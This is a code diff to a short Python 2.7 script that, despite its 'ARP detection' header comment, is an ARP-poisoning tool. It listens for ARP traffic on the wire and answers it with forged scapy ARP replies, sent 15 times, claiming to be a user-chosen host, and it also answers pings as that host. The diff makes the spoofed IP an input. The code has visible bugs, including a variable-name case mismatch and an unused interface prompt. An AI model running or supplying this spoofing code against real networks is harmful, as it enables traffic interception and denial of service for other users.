@@ -1,3 +1,7 @@
+#ARP detection or something
+#Ricky Hosfelt
+#Written for python 2.7.5
+
 #Import socket to grab packets off the wire
 import socket
 
@@ -42,6 +46,7 @@ def dl_parse(packet):
 
 #function for parsing network layer (IP)
 def poison_arp(packet):
+    SpoofedHost = raw_input("IP of host to spoof: ")
     print(packet)
     hw_dst=''
     p_dst=''
@@ -52,22 +57,20 @@ def poison_arp(packet):
             hw_dst+= i+":"
         for i in p_dst_l:
             p_dst+=(int(i,16)+".")
-        send(ARP(hwsrc="aa:bb:cc:dd:ee:ff",hwdst=hw_dst[:-1],psrc="10.42.42.42", pdst=p_dst[:-1], op=0x2, hwtype=0x01,ptype=0x800), count=15)
+        send(ARP(hwsrc="aa:bb:cc:dd:ee:ff",hwdst=hw_dst[:-1],psrc=spoofedHost, pdst=p_dst[:-1], op=0x2, hwtype=0x01,ptype=0x800), count=15)
 
 def icmp_reply(packet):
-
+    interface = input("Interface name: ")
     if ((int(packet[16],16) == 10) and (int(packet[17],16) == 42) and (int(packet[18],16)==42) and (int(packet[19],16) ==42)):
-        sendp(Ether(src="aa:bb:cc:dd:ee:ff")/IP(src="10.42.42.42",dst=ip_dst)/ICMP(type=0x00)/icmp_payload), iface="en0")
+        sendp(Ether(src="aa:bb:cc:dd:ee:ff")/IP(src=SpoofedHost,dst=ip_dst)/ICMP(type=0x00)/icmp_payload, iface="en0")
 
 #receive packets
 while True:
     packet = s.recvfrom(65535)
     for i in packet[0]:
         pkt_l.append(hex(ord(i))[2:])
-        print(pkt_l)
+        #print(pkt_l) uncomment to see packets
     eth_type = dl_parse(pkt_l)
     if eth_type == 0x0806:
         poison_arp(pkt_l)
-#    if eth_type == 0x0800:
-#        icmp_reply(pkt_l)
 
